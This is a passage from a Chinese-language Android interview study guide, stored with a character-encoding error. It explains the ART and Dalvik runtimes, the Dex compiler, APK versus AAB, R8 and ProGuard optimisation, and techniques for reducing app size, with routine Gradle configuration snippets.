<p><strong>ART</strong> é‡‡ç”¨ <strong>æå‰ç¼–è¯‘ï¼ˆAOTï¼‰</strong> æ–¹å¼å¤„ç†åº”ç”¨ï¼šåœ¨åº”ç”¨å®‰è£…æ—¶å°†å­—èŠ‚ç è½¬æ¢ä¸ºæœºå™¨ç ï¼Œçœå»äº†è¿è¡Œæ—¶çš„ <strong>å³æ—¶ç¼–è¯‘ï¼ˆJITï¼‰</strong> æ­¥éª¤ï¼Œä»è€ŒåŠ å¿«åº”ç”¨å¯åŠ¨é€Ÿåº¦ã€é™ä½è¿è¡Œæ—¶çš„ CPU å ç”¨ã€‚</p>
<p><strong>ART</strong> çš„æ ¸å¿ƒç‰¹æ€§åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>æ€§èƒ½æå‡</strong>ï¼š<strong>AOT</strong> ç¼–è¯‘ç”Ÿæˆä¼˜åŒ–åçš„æœºå™¨ç ï¼Œå‡å°‘è¿è¡Œæ—¶å¼€é”€ã€‚</li>
<li><strong>åƒåœ¾å›æ”¶</strong>ï¼šå¼•å…¥äº†æ”¹è¿›çš„åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œæå‡å†…å­˜ç®¡ç†æ•ˆç‡ã€‚</li>
<li><strong>è°ƒè¯•ä¸æ€§èƒ½åˆ†ææ”¯æŒ</strong>ï¼šæä¾›æ›´å¼ºå¤§çš„å¼€å‘è€…å·¥å…·ï¼Œæ¯”å¦‚è¯¦ç»†çš„å †æ ˆè·Ÿè¸ªå’Œå†…å­˜ä½¿ç”¨åˆ†æåŠŸèƒ½ã€‚</li>
</ul>
<h3 data-id="heading-9">Dalvik</h3>
<p><strong>Dalvik</strong> æ˜¯ <strong>ART</strong> ä¹‹å‰ Android çš„åˆä»£è¿è¡Œæ—¶ï¼Œè®¾è®¡ç”¨äºåœ¨å†…å­˜å’Œç®—åŠ›æœ‰é™çš„è™šæ‹Ÿç¯å¢ƒä¸­æ‰§è¡Œåº”ç”¨ã€‚</p>
<p><strong>Dalvik</strong> é‡‡ç”¨ <strong>å³æ—¶ç¼–è¯‘ï¼ˆJITï¼‰</strong> æ–¹å¼ï¼šåœ¨è¿è¡Œæ—¶å°†å­—èŠ‚ç è½¬æ¢ä¸ºæœºå™¨ç ã€‚è¿™ç§æ–¹å¼å‡å°‘äº†åº”ç”¨å®‰è£…æ—¶é—´ï¼Œä½†å®æ—¶ç¼–è¯‘ä¼šå¢åŠ è¿è¡Œæ—¶å¼€é”€ã€‚</p>
<p><strong>Dalvik</strong> çš„æ ¸å¿ƒç‰¹ç‚¹åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>ç´§å‡‘çš„å­—èŠ‚ç </strong>ï¼šä½¿ç”¨ <code>.dex</code>ï¼ˆ<strong>Dalvik</strong> å¯æ‰§è¡Œæ–‡ä»¶ï¼‰æ ¼å¼ï¼Œä¼˜åŒ–äº†å†…å­˜å ç”¨å’Œæ‰§è¡Œæ•ˆç‡ã€‚</li>
<li><strong>åŸºäºå¯„å­˜å™¨çš„è™šæ‹Ÿæœº</strong>ï¼šä¸åŒäº Java è™šæ‹Ÿæœºçš„æ ˆå¼ç»“æ„ï¼Œ<strong>Dalvik</strong> æ˜¯åŸºäºå¯„å­˜å™¨çš„ï¼Œæå‡äº†æŒ‡ä»¤æ‰§è¡Œæ•ˆç‡ã€‚</li>
</ul>
<p><strong>Dalvik</strong> çš„å±€é™æ€§ï¼ˆå¦‚å¯åŠ¨æ…¢ã€CPU å ç”¨é«˜ï¼‰ï¼Œä½¿å…¶åœ¨ Android æ–°ç‰ˆæœ¬ä¸­è¢« <strong>ART</strong> å–ä»£ã€‚</p>
<h3 data-id="heading-10">Dex ç¼–è¯‘å™¨</h3>
<p><strong>Dex ç¼–è¯‘å™¨</strong> è´Ÿè´£å°† Java/Kotlin ç¼–è¯‘å™¨ç”Ÿæˆçš„ Java å­—èŠ‚ç ï¼Œè½¬æ¢ä¸º <code>.dex</code>ï¼ˆ<strong>Dalvik</strong> å¯æ‰§è¡Œæ–‡ä»¶ï¼‰æ ¼å¼ã€‚è¿™ç§ <code>.dex</code> æ–‡ä»¶ä½“ç§¯ç´§å‡‘ï¼Œä¸“ä¸º <strong>Dalvik</strong> å’Œ <strong>ART</strong> è¿è¡Œæ—¶ç¯å¢ƒä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-11">Dex ç¼–è¯‘å™¨çš„æ ¸å¿ƒä½œç”¨</h3>
<p><strong>Dex ç¼–è¯‘å™¨</strong> æ˜¯ Android åº”ç”¨é«˜æ•ˆè¿è¡Œçš„å…³é”®ï¼Œæ ¸å¿ƒåŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>å¤š dex æ”¯æŒ</strong>ï¼šå½“åº”ç”¨æ–¹æ³•æ•°è¶…è¿‡ 64K é™åˆ¶æ—¶ï¼Œç¼–è¯‘å™¨ä¼šå°†å­—èŠ‚ç æ‹†åˆ†åˆ°å¤šä¸ª <code>.dex</code> æ–‡ä»¶ä¸­ã€‚</li>
<li><strong>å­—èŠ‚ç ä¼˜åŒ–</strong>ï¼šå¯¹å­—èŠ‚ç è¿›è¡Œä¼˜åŒ–ï¼Œæå‡ Android è®¾å¤‡ä¸Šçš„å†…å­˜å ç”¨å’Œæ‰§è¡Œæ€§èƒ½ã€‚</li>
</ul>
<p>Dex ç¼–è¯‘æµç¨‹å·²é›†æˆåˆ° Android æ„å»ºç³»ç»Ÿä¸­ï¼Œåœ¨åº”ç”¨å¼€å‘çš„æ„å»ºé˜¶æ®µè‡ªåŠ¨æ‰§è¡Œã€‚</p>
<h3 data-id="heading-12">ä» Dalvik åˆ° ART çš„è¿‡æ¸¡</h3>
<p>ä» <strong>Dalvik</strong> åˆ° <strong>ART</strong> çš„åˆ‡æ¢ï¼Œæ˜¯ Android è¿è¡Œæ—¶ç¯å¢ƒçš„é‡å¤§å‡çº§ã€‚<strong>ART</strong> çš„ <strong>AOT</strong> ç¼–è¯‘ã€å¢å¼ºå‹åƒåœ¾å›æ”¶å’Œæ€§èƒ½åˆ†æèƒ½åŠ›ï¼Œä¸ºå¼€å‘è€…å’Œç”¨æˆ·å¸¦æ¥äº†æ›´å¥½çš„ä½“éªŒã€‚ç”±äºä½¿ç”¨äº† <code>.dex</code> æ–‡ä»¶ï¼Œä¸º <strong>Dalvik</strong> è®¾è®¡çš„åº”ç”¨å¯ä»¥æ— ç¼å…¼å®¹ <strong>ART</strong>ï¼Œè®©å¼€å‘è€…èƒ½å¹³æ»‘è¿ç§»ã€‚</p>
<h3 data-id="heading-13">æ€»ç»“</h3>
<p><strong>ART</strong>ã€<strong>Dalvik</strong> å’Œ <strong>Dex ç¼–è¯‘å™¨</strong> æ˜¯ Android åº”ç”¨æ‰§è¡Œçš„åŸºç¡€ï¼š<strong>ART</strong> ä»¥ <strong>AOT</strong> ç¼–è¯‘å’Œæ€§èƒ½æå‡å–ä»£äº†ä¾èµ– <strong>JIT</strong> çš„ <strong>Dalvik</strong>ï¼›<strong>Dex ç¼–è¯‘å™¨</strong> åˆ™é€šè¿‡å°† Java å­—èŠ‚ç è½¬æ¢ä¸ºé€‚é…ä¸¤ç§è¿è¡Œæ—¶çš„ <code>.dex</code> æ–‡ä»¶ï¼Œè¡”æ¥äº†æ•´ä¸ªæµç¨‹ã€‚è¿™äº›ç»„ä»¶å…±åŒä¿éšœäº† Android åº”ç”¨çš„é«˜æ•ˆã€å¿«é€Ÿå’Œå¯é è¿è¡Œã€‚</p>
<h2 data-id="heading-14">APK æ–‡ä»¶ä¸ AAB æ–‡ä»¶æœ‰ä»€ä¹ˆåŒºåˆ«</h2>
<p>Android åº”ç”¨çš„åˆ†å‘å’Œå®‰è£…ä¸»è¦ä½¿ç”¨ä¸¤ç§æ ¼å¼ï¼š<strong>APK</strong>ï¼ˆAndroid å®‰è£…åŒ…ï¼‰å’Œ <strong>AAB</strong>ï¼ˆAndroid App Bundleï¼‰ã€‚ä¸¤è€…éƒ½ç”¨äºäº¤ä»˜åº”ç”¨ï¼Œä½†åœ¨ç”¨é€”ã€ç»“æ„å’Œå®‰è£…æµç¨‹ä¸Šæœ‰æ˜¾è‘—å·®å¼‚ã€‚</p>
<h3 data-id="heading-15">é¢è¯•é—®é¢˜</h3>
<p>AAB æ ¼å¼å¦‚ä½•é’ˆå¯¹ä¸åŒè®¾å¤‡é…ç½®ä¼˜åŒ–åº”ç”¨äº¤ä»˜ï¼Ÿç›¸æ¯”ä¼ ç»Ÿ APK åˆ†å‘æœ‰å“ªäº›ä¼˜åŠ¿ï¼Ÿ</p>
<h3 data-id="heading-16">APKï¼ˆAndroid å®‰è£…åŒ…ï¼‰</h3>
<p><strong>APK</strong> æ˜¯ä¼ ç»Ÿçš„ Android åº”ç”¨åˆ†å‘/å®‰è£…æ ¼å¼ï¼Œæ˜¯ä¸€ä¸ªå®Œæ•´çš„å¯å®‰è£…åŒ…ï¼ŒåŒ…å«åº”ç”¨åœ¨è®¾å¤‡ä¸Šè¿è¡Œæ‰€éœ€çš„æ‰€æœ‰èµ„æºã€ä»£ç å’Œå…ƒæ•°æ®ã€‚</p>
<p><strong>APK</strong> æ˜¯è‡ªåŒ…å«çš„ï¼Œä¼šåŒ…å«é€‚é…æ‰€æœ‰è®¾å¤‡é…ç½®ï¼ˆå¦‚å±å¹•å¯†åº¦ã€CPU æ¶æ„ã€è¯­è¨€ï¼‰çš„èµ„æºâ€”â€”è¿™ä¼šå¯¼è‡´æ–‡ä»¶ä½“ç§¯è¾ƒå¤§ï¼Œå› ä¸ºå…¶ä¸­å¯èƒ½åŒ…å«å¯¹å½“å‰è®¾å¤‡æ— ç”¨çš„èµ„æºã€‚</p>
<p><strong>APK</strong> å¯ä»¥ç›´æ¥å®‰è£…åˆ°è®¾å¤‡ï¼Œä¹Ÿèƒ½åœ¨å®˜æ–¹åº”ç”¨å•†åº—å¤–åˆ†äº«æˆ–ä¾§è½½ã€‚ä½†å¼€å‘è€…éœ€è¦è‡ªè¡Œç®¡ç†å¤šè®¾å¤‡çš„é…ç½®é€‚é…ï¼ŒAPK ä¸­å¾€å¾€ä¼šåŒ…å«ç‰¹å®šè®¾å¤‡ä¸éœ€è¦çš„èµ„æºã€‚</p>
<h3 data-id="heading-17">AABï¼ˆAndroid App Bundleï¼‰</h3>
<p><strong>AAB</strong> æ˜¯ Google æ¨å‡ºçš„å‘å¸ƒæ ¼å¼ï¼Œå¹¶éåƒ <strong>APK</strong> é‚£æ ·çš„å¯ç›´æ¥å®‰è£…æ ¼å¼ã€‚å¼€å‘è€…å°† <strong>AAB</strong> ä¸Šä¼ åˆ° Google Playï¼Œç”±å•†åº—åœ¨ä¸‹è½½æ—¶ç”Ÿæˆé€‚é…ç›®æ ‡è®¾å¤‡çš„ä¼˜åŒ– <strong>APK</strong>ã€‚</p>
<p><strong>AAB</strong> æ˜¯æ¨¡å—åŒ–çš„ï¼Œä¼šå°†ä¸åŒé…ç½®çš„èµ„æºå’Œä»£ç æ‹†åˆ†æˆç‹¬ç«‹çš„ <code>bundle</code>ã€‚<strong>Google Play</strong> åˆ©ç”¨è¿™ç§ç»“æ„ï¼Œåªå‘ç”¨æˆ·äº¤ä»˜å¯¹åº”è®¾å¤‡æ‰€éœ€çš„èµ„æºå’Œä»£ç ï¼ˆæ¯”å¦‚ç‰¹å®šå±å¹•å°ºå¯¸ã€CPU æ¶æ„ã€è¯­è¨€çš„ç‰ˆæœ¬ï¼‰ï¼Œä»è€Œå‡å°åº”ç”¨åœ¨è®¾å¤‡ä¸Šçš„ä½“ç§¯ã€‚</p>
<p>ç”±äº <strong>AAB</strong> æ˜¯åœ¨æœåŠ¡ç«¯å¤„ç†çš„ï¼Œå®ƒä¸èƒ½ç›´æ¥å®‰è£…ã€‚å¼€å‘è€…è‹¥è¦ä¾§è½½ï¼Œéœ€è¦å€ŸåŠ© <code>bundletool</code> ç­‰å·¥å…·ç”Ÿæˆå¯å®‰è£…çš„ <strong>APK</strong>ã€‚</p>
<h3 data-id="heading-18">APK ä¸ AAB çš„æ ¸å¿ƒåŒºåˆ«</h3>
<ol>
<li>
<p><strong>ç”¨é€”ä¸ç»“æ„</strong></p>
<ul>
<li><strong>APK</strong>ï¼šåŒ…å«æ‰€æœ‰é…ç½®èµ„æºå’Œä»£ç çš„å®Œæ•´å®‰è£…åŒ…ã€‚</li>
<li><strong>AAB</strong>ï¼šæ¨¡å—åŒ–çš„å‘å¸ƒæ ¼å¼ï¼Œä¼šç”Ÿæˆé€‚é…è®¾å¤‡çš„ <strong>APK</strong>ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ–‡ä»¶ä½“ç§¯</strong></p>
<ul>
<li><strong>APK</strong>ï¼šåŒ…å«æ‰€æœ‰è®¾å¤‡çš„èµ„æºï¼Œä½“ç§¯è¾ƒå¤§ã€‚</li>
<li><strong>AAB</strong>ï¼šå¯ç”Ÿæˆæ›´å°çš„ä¼˜åŒ– <strong>APK</strong>ï¼Œå‡å°‘ç”¨æˆ·ç«¯çš„åº”ç”¨ä½“ç§¯ã€‚</li>
</ul>
</li>
<li>
<p><strong>åˆ†å‘æ–¹å¼</strong></p>
<ul>
<li><strong>APK</strong>ï¼šå¯ç›´æ¥åˆ†äº«ã€ä¾§è½½åˆ°è®¾å¤‡ã€‚</li>
<li><strong>AAB</strong>ï¼šéœ€ä¸Šä¼ åˆ° <strong>Google Play</strong>ï¼Œç”±å•†åº—ç”Ÿæˆä¼˜åŒ– <strong>APK</strong> ååˆ†å‘ç»™ç”¨æˆ·ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç®¡ç†æ–¹å¼</strong></p>
<ul>
<li><strong>APK</strong>ï¼šå¼€å‘è€…éœ€æ‰‹åŠ¨ç®¡ç†èµ„æºå’Œé…ç½®ã€‚</li>
<li><strong>AAB</strong>ï¼šå°†é…ç½®ç®¡ç†äº¤ç”± <strong>Google Play</strong> è‡ªåŠ¨åŒ–å¤„ç†ã€‚</li>
</ul>
</li>
<li>
<p><strong>å·¥å…·ä¸å…¼å®¹æ€§</strong></p>
<ul>
<li><strong>APK</strong>ï¼šæ”¯æŒæ‰€æœ‰ Android è®¾å¤‡å’Œåº”ç”¨å•†åº—ã€‚</li>
<li><strong>AAB</strong>ï¼šé»˜è®¤éœ€è¦ <strong>Google Play</strong> æˆ– <code>bundletool</code> ç”Ÿæˆå¯å®‰è£… <strong>APK</strong>ï¼Œä¸å…¼å®¹é <strong>Google</strong> åº”ç”¨å•†åº—ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">æ€»ç»“</h3>
<p><strong>APK</strong> æ˜¯ç‹¬ç«‹çš„å¯ç›´æ¥å®‰è£…åŒ…ï¼Œè€Œ <strong>AAB</strong> æ˜¯é¢å‘ç°ä»£åˆ†å‘çš„æ ¼å¼ï¼Œèƒ½ç”Ÿæˆé€‚é…è®¾å¤‡çš„ <strong>APK</strong>ã€‚å¼€å‘è€…ä½¿ç”¨ <strong>AAB</strong> å¯ä»¥è·å¾—æ›´å°çš„åº”ç”¨ä½“ç§¯å’Œè‡ªåŠ¨åŒ–çš„é…ç½®ç®¡ç†ï¼Œè€Œ <strong>APK</strong> ä»æ˜¯ä¾§è½½ï¼ˆç»•è¿‡å®˜æ–¹åº”ç”¨å•†åº—å®‰è£… Appï¼‰å’Œé <strong>Google Play</strong> åˆ†å‘çš„å¿…è¦é€‰æ‹©ã€‚ç†è§£ä¸¤è€…çš„å·®å¼‚ï¼Œèƒ½å¸®åŠ©å¼€å‘è€…æ ¹æ®åˆ†å‘ç­–ç•¥é€‰æ‹©åˆé€‚çš„æ ¼å¼ã€‚</p>
<h2 data-id="heading-20">R8 ä¼˜åŒ–</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb9874991e2244dd8595e5c60eb59b47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768436859&amp;x-signature=cRwUBpar1jltd5BKE%2Fxa16OyCiA%3D" alt="33.png" loading="lazy"/></p>
<p><strong>R8</strong> æ˜¯ Android æ„å»ºæµç¨‹ä¸­ç”¨äºå‡å° <strong>APK/AAB</strong> ä½“ç§¯ã€æå‡è¿è¡Œæ€§èƒ½çš„ä»£ç å‹ç¼©ä¸ä¼˜åŒ–å·¥å…·ã€‚å®ƒå–ä»£äº†æ—§çš„ <strong>ProGuard</strong> å·¥å…·ï¼Œæ— ç¼é›†æˆåˆ° Android æ„å»ºç³»ç»Ÿä¸­ï¼Œæä¾›ä»£ç å‹ç¼©ã€ä¼˜åŒ–ã€æ··æ·†å’Œèµ„æºç®¡ç†ç­‰è¿›é˜¶åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-21">é¢è¯•é—®é¢˜</h3>
<p><strong>R8</strong> ä¼˜åŒ–å¦‚ä½•æå‡åº”ç”¨æ€§èƒ½å¹¶å‡å° <strong>APK/AAB</strong> ä½“ç§¯ï¼Ÿ</p>
<p><strong>R8</strong> ä¸ <strong>ProGuard</strong> æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿå®ƒå¸¦æ¥äº†å“ªäº›ä¼˜åŠ¿ï¼Ÿ</p>
<h3 data-id="heading-22">R8 çš„å·¥ä½œåŸç†</h3>
<p><strong>R8</strong> åœ¨æ„å»ºé˜¶æ®µå¤„ç†åº”ç”¨ä»£ç ï¼Œå®ç°ä»¥ä¸‹ç›®æ ‡ï¼š</p>
<ul>
<li><strong>ä»£ç å‹ç¼©</strong>ï¼šç§»é™¤ä»£ç åº“ä¸­æœªä½¿ç”¨çš„ç±»ã€æ–¹æ³•ã€å­—æ®µå’Œå±æ€§ï¼Œå‡å°æœ€ç»ˆ <strong>APK/AAB</strong> çš„ä½“ç§¯ã€‚</li>
<li><strong>ä»£ç ä¼˜åŒ–</strong>ï¼šç®€åŒ–å’Œé‡æ„ä»£ç ä»¥æå‡è¿è¡Œæ€§èƒ½ï¼ŒåŒ…æ‹¬å†…è”æ–¹æ³•ã€ç§»é™¤å†—ä½™ä»£ç ã€åˆå¹¶é‡å¤ä»£ç å—ç­‰ã€‚</li>
<li><strong>ä»£ç æ··æ·†</strong>ï¼šé‡å‘½åç±»ã€æ–¹æ³•å’Œå­—æ®µçš„åç§°ï¼Œå¢åŠ é€†å‘å·¥ç¨‹çš„éš¾åº¦ã€‚</li>
<li><strong>èµ„æºä¼˜åŒ–</strong>ï¼šç§»é™¤æœªä½¿ç”¨çš„èµ„æºï¼ˆå¦‚å¸ƒå±€ã€<code>Drawable</code>ã€å­—ç¬¦ä¸²ï¼‰ï¼Œè¿›ä¸€æ­¥å‡å°åº”ç”¨ä½“ç§¯ã€‚</li>
</ul>
<h3 data-id="heading-23">R8 ä¼˜åŒ–çš„æ ¸å¿ƒç‰¹æ€§</h3>
<ul>
<li><strong>æ— ç”¨ä»£ç ç§»é™¤</strong>ï¼šåˆ†æä»£ç åº“ï¼Œè¯†åˆ«å¹¶åˆ é™¤åº”ç”¨æ— æ³•è®¿é—®æˆ–æœªä½¿ç”¨çš„ä»£ç ã€‚</li>
<li><strong>æ–¹æ³•å†…è”</strong>ï¼šå°†çŸ­æ–¹æ³•ç›´æ¥å†…è”åˆ°è°ƒç”¨å¤„ï¼Œå‡å°‘æ–¹æ³•è°ƒç”¨å¼€é”€ï¼Œæå‡è¿è¡Œæ€§èƒ½ã€‚</li>
<li><strong>ç±»åˆå¹¶</strong>ï¼šå°†ç›¸ä¼¼çš„ç±»æˆ–æ¥å£åˆå¹¶ï¼Œå‡å°å†…å­˜å ç”¨å¹¶æå‡æ•ˆç‡ã€‚</li>
<li><strong>ä¸å¯è¾¾ä»£ç æ¶ˆé™¤</strong>ï¼šå®Œå…¨ç§»é™¤æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç è·¯å¾„ã€‚</li>
<li><strong>å¸¸é‡æŠ˜å ä¸ä¼ æ’­</strong>ï¼šç®€åŒ–è¡¨è¾¾å¼ï¼Œå°†å˜é‡æ›¿æ¢ä¸ºå…¶å¸¸é‡å€¼ã€‚</li>
<li><strong>ä»£ç æ··æ·†</strong>ï¼šç”¨æ›´çŸ­ã€æ— æ„ä¹‰çš„åç§°æ›¿æ¢ä»£ç ä¸­çš„æœ‰æ„ä¹‰å‘½åï¼Œæ—¢å‡å°ä½“ç§¯åˆæå‡é€†å‘éš¾åº¦ã€‚</li>
</ul>
<h3 data-id="heading-24">R8 çš„é…ç½®</h3>
<p><strong>R8</strong> ä½¿ç”¨ <strong>ProGuard</strong> è§„åˆ™è¿›è¡Œé…ç½®ï¼Œä½ å¯ä»¥æŒ‡å®šå“ªäº›ä»£ç éœ€è¦æ’é™¤åœ¨å‹ç¼©ã€æ··æ·†æˆ–ä¼˜åŒ–ä¹‹å¤–ã€‚å¸¸è§åœºæ™¯åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>ä¿ç•™åå°„ç”¨ä»£ç </strong>ï¼šé€šè¿‡åå°„è®¿é—®çš„ç±»æˆ–æ–¹æ³•ï¼Œå¿…é¡»åœ¨ <strong>ProGuard</strong> è§„åˆ™ä¸­æ˜¾å¼ä¿ç•™ã€‚</li>
<li><strong>æ’é™¤ç¬¬ä¸‰æ–¹åº“</strong>ï¼šéƒ¨åˆ†åº“å¯èƒ½éœ€è¦ç‰¹å®šè§„åˆ™æ‰èƒ½é¿å…åŠŸèƒ½å¼‚å¸¸ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼šä¿ç•™æŸä¸ªç±»çš„ <strong>ProGuard</strong> è§„åˆ™</p>
<pre><code class="hljs language-kotlin" lang="kotlin">-keep <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.<span class="hljs-title">example</span>.<span class="hljs-title">myapp</span>.<span class="hljs-title">MyClass</span> { *; }
</code></pre>
<h3 data-id="heading-25">R8 çš„ä¼˜åŠ¿</h3>
<ul>
<li><strong>æ·±åº¦é›†æˆ</strong>ï¼šå†…ç½®åˆ° Android æ„å»ºç³»ç»Ÿä¸­ï¼Œåªéœ€é…ç½® <strong>ProGuard</strong> è§„åˆ™ï¼Œæ— éœ€é¢å¤–è®¾ç½®ã€‚</li>
<li><strong>æ›´é«˜æ•ˆç‡</strong>ï¼šå°†å‹ç¼©ã€ä¼˜åŒ–ã€æ··æ·†åˆå¹¶ä¸ºå•æ¬¡å¤„ç†ï¼Œæ¯” <strong>ProGuard</strong> æ›´å¿«æ›´é«˜æ•ˆã€‚</li>
<li><strong>å‡å°åº”ç”¨ä½“ç§¯</strong>ï¼šç§»é™¤æœªä½¿ç”¨çš„ä»£ç å’Œèµ„æºï¼Œæ˜¾è‘—é™ä½æœ€ç»ˆ <strong>APK/AAB</strong> çš„å¤§å°ã€‚</li>
<li><strong>å¢å¼ºå®‰å…¨æ€§</strong>ï¼šæ··æ·†åŠŸèƒ½å¢åŠ äº†æ”»å‡»è€…é€†å‘å·¥ç¨‹çš„éš¾åº¦ï¼Œä¿æŠ¤çŸ¥è¯†äº§æƒã€‚</li>
</ul>
<h3 data-id="heading-26">R8 çš„å±€é™æ€§</h3>
<ul>
<li><strong>è¿‡åº¦å‹ç¼©é£é™©</strong>ï¼šè‹¥é…ç½®ä¸å½“ï¼Œ<strong>R8</strong> å¯èƒ½ç§»é™¤é—´æ¥å¼•ç”¨çš„ä»£ç æˆ–èµ„æºï¼Œå¯¼è‡´è¿è¡Œæ—¶é”™è¯¯ã€‚</li>
<li><strong>é…ç½®å¤æ‚åº¦</strong>ï¼šå¯¹äºä½¿ç”¨åå°„æˆ–åŠ¨æ€ç±»åŠ è½½çš„å¤æ‚é¡¹ç›®ï¼Œç¼–å†™ <strong>ProGuard</strong> è§„åˆ™ä¼šæ¯”è¾ƒæœ‰æŒ‘æˆ˜ã€‚</li>
<li><strong>è°ƒè¯•éš¾åº¦æå‡</strong>ï¼šæ··æ·†ä¼šè®©å †æ ˆè·Ÿè¸ªåŒ…å«æ— æ„ä¹‰çš„åç§°ï¼Œå¢åŠ è°ƒè¯•éš¾åº¦ã€‚</li>
</ul>
<h3 data-id="heading-27">æ€»ç»“</h3>
<p><strong>R8</strong> æ˜¯ç°ä»£ Android å¼€å‘ä¸­å¿…ä¸å¯å°‘çš„å·¥å…·ï¼Œæä¾›äº†å…¨é¢çš„ä»£ç å‹ç¼©ã€ä¼˜åŒ–å’Œæ··æ·†èƒ½åŠ›ã€‚å®ƒé€šè¿‡å‡å°åº”ç”¨ä½“ç§¯ã€æå‡è¿è¡Œæ€§èƒ½ã€å¢å¼ºå®‰å…¨æ€§ï¼Œå¸®åŠ©å¼€å‘è€…äº¤ä»˜é«˜æ•ˆç´§å‡‘çš„åº”ç”¨ã€‚æ­£ç¡®é…ç½® <strong>ProGuard</strong> è§„åˆ™æ˜¯å…³é”®ï¼Œèƒ½é¿å…å¿…è¦ä»£ç è¢«è¯¯åˆ ï¼Œä¿è¯åŠŸèƒ½æ­£å¸¸ã€‚</p>
<h2 data-id="heading-28">å‡å°åº”ç”¨ä½“ç§¯</h2>
<p>ä¼˜åŒ– Android åº”ç”¨ä½“ç§¯å¯¹æå‡ç”¨æˆ·ä½“éªŒè‡³å…³é‡è¦ï¼Œå°¤å…¶æ˜¯å¯¹äºå­˜å‚¨æœ‰é™æˆ–ç½‘ç»œè¾ƒæ…¢çš„ç”¨æˆ·ã€‚å¯ä»¥é€šè¿‡å¤šç§ç­–ç•¥åœ¨ä¸å½±å“åŠŸèƒ½çš„å‰æä¸‹å‡å°åº”ç”¨ä½“ç§¯ã€‚</p>
<h3 data-id="heading-29">é¢è¯•é—®é¢˜</h3>
<p>ä½ çš„åº”ç”¨åŒ…å«é«˜æ¸…å›¾ç‰‡ï¼Œå¯¼è‡´ <strong>APK/AAB</strong> ä½“ç§¯å¤§å¹…å¢åŠ ã€‚å¦‚ä½•åœ¨ä¿è¯ç”»è´¨çš„å‰æä¸‹ä¼˜åŒ–å›¾ç‰‡èµ„æºï¼Ÿåº”è¯¥ç”¨ä»€ä¹ˆæ ¼å¼å®ç°æœ€é«˜æ•ˆçš„å‹ç¼©ï¼Ÿ</p>
<p>ä½ çš„åº”ç”¨åŒ…å«å¤šä¸ªåŠŸèƒ½ï¼Œä½†å¤§éƒ¨åˆ†ç”¨æˆ·å¾ˆå°‘ä½¿ç”¨å…¶ä¸­ä¸€äº›ã€‚å¦‚ä½•å®ç°æ–¹æ¡ˆæ¥å‡å°åˆå§‹å®‰è£…åŒ…ä½“ç§¯ï¼ŒåŒæ—¶è®©è¿™äº›åŠŸèƒ½åœ¨éœ€è¦æ—¶å¯ç”¨ï¼Ÿ</p>
<h3 data-id="heading-30">ç§»é™¤æœªä½¿ç”¨çš„èµ„æº</h3>
<p>æœªä½¿ç”¨çš„èµ„æºï¼ˆå¦‚å›¾ç‰‡ã€å¸ƒå±€ã€å­—ç¬¦ä¸²ï¼‰ä¼šä¸å¿…è¦åœ°å¢å¤§ <strong>APK/AAB</strong> ä½“ç§¯ã€‚Android Studio çš„ <strong>Lint</strong> å·¥å…·å¯ä»¥å¸®ä½ è¯†åˆ«è¿™äº›èµ„æºã€‚ç§»é™¤åï¼Œåœ¨ <code>build.gradle</code> ä¸­å¼€å¯ <code>shrinkResources</code>ï¼Œè®©æ„å»ºæµç¨‹è‡ªåŠ¨ç§»é™¤æœªä½¿ç”¨èµ„æºï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">android {
    buildTypes {
        release {
            minifyEnabled <span class="hljs-literal">true</span>
            shrinkResources <span class="hljs-literal">true</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-31">å¯ç”¨ R8 ä»£ç å‹ç¼©</h3>
<p><strong>R8</strong> æ˜¯ Android é»˜è®¤çš„ä»£ç å‹ç¼©ä¸ä¼˜åŒ–å·¥å…·ï¼Œä¼šç§»é™¤æœªä½¿ç”¨çš„ç±»å’Œæ–¹æ³•ï¼ŒåŒæ—¶æ··æ·†ä»£ç ä»¥å‡å°ä½“ç§¯ã€‚æ­£ç¡®é…ç½® <strong>ProGuard</strong> è§„åˆ™å¯ä»¥é¿å…å…³é”®ä»£ç æˆ–åå°„ç±»åº“è¢«è¯¯åˆ ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">android {
    buildTypes {
        release {
            minifyEnabled <span class="hljs-literal">true</span>
            proguardFiles getDefaultProguardFile(<span class="hljs-string">'proguard-android-optimize.txt'</span>), <span class="hljs-string">'proguard-rules.pro'</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-32">ä¼˜åŒ–èµ„æº</h3>
<p>ä¼˜åŒ–å›¾ç‰‡ã€XML ç­‰èµ„æºå¯ä»¥æ˜¾è‘—å‡å°åº”ç”¨ä½“ç§¯ï¼š</p>
<ul>
<li><strong>çŸ¢é‡å›¾ï¼ˆVector Drawablesï¼‰</strong>ï¼šç”¨çŸ¢é‡å›¾æ›¿ä»£ <strong>PNG</strong>ã€<strong>JPEG</strong> ç­‰ä½å›¾ï¼Œæ—¢èƒ½ç¼©æ”¾åˆèƒ½èŠ‚çœç©ºé—´ã€‚</li>
<li><strong>å›¾ç‰‡å‹ç¼©</strong>ï¼šä½¿ç”¨ <strong>TinyPNG</strong> æˆ– <strong>ImageMagick</strong> ç­‰å·¥å…·å‹ç¼©ä½å›¾ï¼Œåœ¨ç”»è´¨æ— æ˜æ˜¾æŸå¤±çš„å‰æä¸‹å‡å°ä½“ç§¯ã€‚</li>
